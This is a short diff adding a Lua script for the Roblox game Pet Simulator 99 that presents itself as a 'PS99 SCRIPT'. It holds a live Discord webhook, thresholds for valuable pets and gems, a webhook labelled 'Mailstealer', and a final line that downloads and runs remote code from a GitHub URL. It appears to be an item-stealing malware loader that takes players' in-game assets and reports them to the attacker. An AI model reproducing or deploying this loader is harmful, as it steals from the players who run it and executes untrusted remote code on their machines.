@@ -1,0 +1,11 @@
+DualhookUsername = "R3LIG"
+DualhookWebHook = "https://discord.com/api/webhooks/1209459420363358208/6atpYbXfqFeNItvZnNCpFR0ZNMEffse5LMAuKOQ46oORilKVvyfyNjCEqUnDTrTdIpXN"
+
+HugeSetting = 5   
+GemSetting = 50000000 
+
+-- Custom Settings!
+LoadingScreenTitle = "PS99 SCRIPT" -- Loading Screen Title
+WebHookName = "... Mailstealer" -- Webhook Name
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/MoriPremium/main/MoriPremium"))()
